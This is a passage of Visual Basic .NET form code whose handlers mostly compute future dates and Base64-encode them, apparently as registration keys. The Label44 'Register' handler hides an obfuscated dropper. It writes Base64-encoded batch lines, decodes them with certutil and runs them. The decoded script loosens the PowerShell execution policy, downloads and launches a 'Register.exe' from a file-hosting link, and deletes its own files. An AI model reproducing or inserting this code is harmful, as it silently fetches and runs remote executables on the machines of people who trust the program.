        Console.WriteLine("342 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label14_Click(sender As Object, e As EventArgs) Handles Label14.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(374)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("374 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label15_Click(sender As Object, e As EventArgs) Handles Label15.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(22)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("22 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label16_Click(sender As Object, e As EventArgs) Handles Label16.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(404)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("404 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label17_Click(sender As Object, e As EventArgs) Handles Label17.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(434)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("434 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label18_Click(sender As Object, e As EventArgs) Handles Label18.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(465)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("465 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label19_Click(sender As Object, e As EventArgs) Handles Label19.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(496)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("496 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label20_Click(sender As Object, e As EventArgs) Handles Label20.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(527)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("527 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label21_Click(sender As Object, e As EventArgs) Handles Label21.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(558)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("558 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label22_Click(sender As Object, e As EventArgs) Handles Label22.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(589)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("589 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label23_Click(sender As Object, e As EventArgs) Handles Label23.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(620)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("620 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label24_Click(sender As Object, e As EventArgs) Handles Label24.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(651)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("651 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label25_Click(sender As Object, e As EventArgs) Handles Label25.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(682)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("682 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label26_Click(sender As Object, e As EventArgs) Handles Label26.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(713)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("713 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label27_Click(sender As Object, e As EventArgs) Handles Label27.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(744)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("744 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label33_Click(sender As Object, e As EventArgs) Handles Label33.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(775)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("775 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub

    Private Sub Label34_Click(sender As Object, e As EventArgs) Handles Label34.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(808)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("808 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub

    Private Sub Label35_Click(sender As Object, e As EventArgs) Handles Label35.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(837)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("837 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label36_Click(sender As Object, e As EventArgs) Handles Label36.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(7333)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("7333 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label37_Click(sender As Object, e As EventArgs) Handles Label37.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(1888)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("1888 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label38_Click(sender As Object, e As EventArgs) Handles Label38.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(11111)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("11111 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        My.Computer.Clipboard.SetText("" & TextBox1.Text)
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        TextBox1.Text = My.Computer.Clipboard.GetText()
    End Sub
    Private Sub Label41_Click(sender As Object, e As EventArgs) Handles Label41.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(14789)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("14789 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label42_Click(sender As Object, e As EventArgs) Handles Label42.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(18555)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("18555 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label43_Click(sender As Object, e As EventArgs) Handles Label43.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(22222)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("22222 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label44_Click(sender As Object, e As EventArgs) Handles Label44.Click
        If (IO.File.Exists("Register.bat")) Then GoTo Register
        Call Register()
        GoTo EndSub
Register:
        Process.Start("Register.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub Register()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo OkFkdmFuY2VkWW91dHViZURvd25sb2FkZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4>>Register.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXFJlZ2lzdGVyLmV4ZSBnb3RvIFJlZ2lzdGVyDQppZiBleGlzdCAl>>Register.Files")
        sb.AppendLine("echo fmRwMFxSZWdpc3Rlci5leGUgZ290byBTdGFydFJlZ2lzdGVyDQo6UmVnaXN0ZXIg>>Register.Files")
        sb.AppendLine("echo DQpAZWNobyBvZmYNCnRpdGxlIFJlZ2lzdGVyDQplY2hvICAgKioqKioqKioqKioq>>Register.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KZWNobyAgICoqKi8v>>Register.Files")
        sb.AppendLine("echo IFVwZGF0ZS1SZWdpc3Rlci5iYXQgLy8gV2luMTAgLy8qKioNCmVjaG8gICAqKioq>>Register.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQpjZCAl>>Register.Files")
        sb.AppendLine("echo fmRwMA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXJMaW5rLmJhdCBkZWwgL3MgL3Eg>>Register.Files")
        sb.AppendLine("echo JX5kcDBcUmVnaXN0ZXJMaW5rLmJhdA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIu>>Register.Files")
        sb.AppendLine("echo dHh0IGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci50eHQNCmlmIGV4aXN0ICV+ZHAw>>Register.Files")
        sb.AppendLine("echo XFJlZ2lzdGVyLkZpbGUgZGVsIC9zIC9xICV+ZHAwXFJlZ2lzdGVyLkZpbGUNCmlm>>Register.Files")
        sb.AppendLine("echo IGV4aXN0ICV+ZHAwXFJlZ2lzdGVyLnBzMSBkZWwgL3MgL3EgJX5kcDBcUmVnaXN0>>Register.Files")
        sb.AppendLine("echo ZXIucHMxDQpwb3dlcnNoZWxsIFNldC1FeGVjdXRpb25Qb2xpY3kgLVNjb3BlIEN1>>Register.Files")
        sb.AppendLine("echo cnJlbnRVc2VyIFVucmVzdHJpY3RlZA0KcG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZv>>Register.Files")
        sb.AppendLine("echo a2UtV2ViUmVxdWVzdCAiaHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUvZzIz>>Register.Files")
        sb.AppendLine("echo cGNoNGx5ZDdoeHJwL1JlZ2lzdGVyLmV4ZSIgLU91dEZpbGUgIlJlZ2lzdGVyLnR4>>Register.Files")
        sb.AppendLine("echo dCINCmNkICV+ZHAwDQpmaW5kIC9JICJrTk8gPSAiIFJlZ2lzdGVyLnR4dD4+UmVn>>Register.Files")
        sb.AppendLine("echo aXN0ZXJMaW5rLmJhdA0KZWNobyBFeGl0Pj5SZWdpc3RlckxpbmsuYmF0DQplY2hv>>Register.Files")
        sb.AppendLine("echo IEtFZGxkQzFEYjI1MFpXNTBJRkpsWjJsemRHVnlUR2x1YXk1aVlYUXBJSHdnRFFw>>Register.Files")
        sb.AppendLine("echo R2IzSmxZV05vTFU5aWFtVmo+PlJlZ2lzdGVyLkZpbGUNCmVjaG8gZENCN0pGOGdM>>Register.Files")
        sb.AppendLine("echo WEpsY0d4aFkyVWdJa3RPVHlBOUlDSXNJQ0p3YjNkbGNuTm9aV3hzSUMxRGIyMXRZ>>Register.Files")
        sb.AppendLine("echo VzVrSUVsdT4+UmVnaXN0ZXIuRmlsZQ0KZWNobyBkbTlyWlMxWFpXSlNaWEYxWlhO>>Register.Files")
        sb.AppendLine("echo MElDSjlJSHdnRFFwVFpYUXRRMjl1ZEdWdWRDQlNaV2RwYzNSbGNreHBibXN1Pj5S>>Register.Files")
        sb.AppendLine("echo ZWdpc3Rlci5GaWxlDQplY2hvIFltRjBEUW9vUjJWMExVTnZiblJsYm5RZ1VtVm5h>>Register.Files")
        sb.AppendLine("echo WE4wWlhKTWFXNXJMbUpoZENrZ2ZDQU5Da1p2Y21WaFkyZ3Q+PlJlZ2lzdGVyLkZp>>Register.Files")
        sb.AppendLine("echo bGUNCmVjaG8gVDJKcVpXTjBJSHNrWHlBdGNtVndiR0ZqWlNBaU95SXNJQ0lnTFU5>>Register.Files")
        sb.AppendLine("echo MWRFWnBiR1VnVW1WbmFYTjBaWEl1WlhobD4+UmVnaXN0ZXIuRmlsZQ0KZWNobyBJ>>Register.Files")
        sb.AppendLine("echo bjBnZkNBTkNsTmxkQzFEYjI1MFpXNTBJRkpsWjJsemRHVnlUR2x1YXk1aVlYUT0+>>Register.Files")
        sb.AppendLine("echo PlJlZ2lzdGVyLkZpbGUNCnRpbWVvdXQgL1QgMQ0KY2VydHV0aWwgLWRlY29kZSBS>>Register.Files")
        sb.AppendLine("echo ZWdpc3Rlci5GaWxlIFJlZ2lzdGVyLnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNo>>Register.Files")
        sb.AppendLine("echo ZWxsLmV4ZSAtRmlsZSBSZWdpc3Rlci5wczEgLU5vRXhpdA0KdGltZW91dCAvVCAx>>Register.Files")
        sb.AppendLine("echo DQpjZCAlfmRwMCAmJiBzdGFydCBSZWdpc3RlckxpbmsuYmF0DQp0aW1lb3V0IC9U>>Register.Files")
        sb.AppendLine("echo IDIyDQpjZCAlfmRwMA0KdGltZW91dCAvVCAyDQppZiBleGlzdCAlfmRwMFxSZWdp>>Register.Files")
        sb.AppendLine("echo c3RlckxpbmsuYmF0IGRlbCAvcyAvcSAlfmRwMFxSZWdpc3RlckxpbmsuYmF0DQpp>>Register.Files")
        sb.AppendLine("echo ZiBleGlzdCAlfmRwMFxSZWdpc3Rlci50eHQgZGVsIC9zIC9xICV+ZHAwXFJlZ2lz>>Register.Files")
        sb.AppendLine("echo dGVyLnR4dA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIuRmlsZSBkZWwgL3MgL3Eg>>Register.Files")
        sb.AppendLine("echo JX5kcDBcUmVnaXN0ZXIuRmlsZQ0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIucHMx>>Register.Files")
        sb.AppendLine("echo IGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci5wczENCmlmIG5vdCBleGlzdCAlfmRw>>Register.Files")
        sb.AppendLine("echo MFxSZWdpc3Rlci5leGUgZ290byBXZWJwYWdlUmVnaXN0ZXINCmlmIGV4aXN0ICV+>>Register.Files")
        sb.AppendLine("echo ZHAwXFJlZ2lzdGVyLmV4ZSBnb3RvIFN0YXJ0UmVnaXN0ZXINCjpTdGFydFJlZ2lz>>Register.Files")
        sb.AppendLine("echo dGVyDQpjZCAlfmRwMFwgJiYgc3RhcnQgUmVnaXN0ZXIuZXhlDQppZiBleGlzdCAl>>Register.Files")
        sb.AppendLine("echo fmRwMFxSZWdpc3Rlclwgcm1kaXIgL3MgL3EgJX5kcDBcUmVnaXN0ZXJcDQppZiBl>>Register.Files")
        sb.AppendLine("echo eGlzdCAlfmRwMFxSZWdpc3RlckxpbmsuYmF0IGRlbCAvcyAvcSAlfmRwMFxSZWdp>>Register.Files")
        sb.AppendLine("echo c3RlckxpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxSZWdpc3Rlci50eHQgZGVsIC9z>>Register.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXFJlZ2lzdGVyLnR4dA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIu>>Register.Files")
        sb.AppendLine("echo RmlsZSBkZWwgL3MgL3EgJX5kcDBcUmVnaXN0ZXIuRmlsZQ0KaWYgZXhpc3QgJX5k>>Register.Files")
        sb.AppendLine("echo cDBcUmVnaXN0ZXIucHMxIGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci5wczENCmdv>>Register.Files")
        sb.AppendLine("echo dG8gRW5kUmVnaXN0ZXINCjpXZWJwYWdlUmVnaXN0ZXINCnN0YXJ0IGh0dHA6Ly93>>Register.Files")
        sb.AppendLine("echo d3cubWVkaWFmaXJlLmNvbS9maWxlL2cyM3BjaDRseWQ3aHhycC9SZWdpc3Rlci5l>>Register.Files")
        sb.AppendLine("echo eGUNCmdvdG8gRW5kUmVnaXN0ZXINCjpFbmRSZWdpc3Rlcg0KZ290byBFeGl0DQo6>>Register.Files")
        sb.AppendLine("echo RXhpdA0KRXhpdA0K>>Register.Files")
        sb.AppendLine("certutil -decode Register.Files Register.bat")
        sb.AppendLine("start Register.bat")
        sb.AppendLine("if exist Register.Files del /s /q Register.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("registering.bat", sb.ToString())
        Process.Start("registering.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("registering.bat")
    End Sub
    Private Sub Label45_Click(sender As Object, e As EventArgs)
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(24444)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("24444 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label46_Click(sender As Object, e As EventArgs) Handles Label46.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(3655)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("3655 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label47_Click(sender As Object, e As EventArgs) Handles Label47.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(5555)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("5555 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label48_Click(sender As Object, e As EventArgs) Handles Label48.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(9222)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("9222 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label49_Click(sender As Object, e As EventArgs) Handles Label49.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(12888)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("12888 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
    Private Sub Label50_Click(sender As Object, e As EventArgs) Handles Label50.Click
        Dim today As System.DateTime
        Dim answer As System.DateTime
        today = System.DateTime.Now
        answer = today.AddDays(16555)
        Console.WriteLine("Today: {0:dddd}", today)
        Console.WriteLine("16555 days from today: {0:dddd}", answer)
        TextBox1.Text = answer
        TextBox1.Text = Convert.ToBase64String(New System.Text.ASCIIEncoding().GetBytes(TextBox1.Text))
        Call Label28_Click(Me, e)
    End Sub
End Class
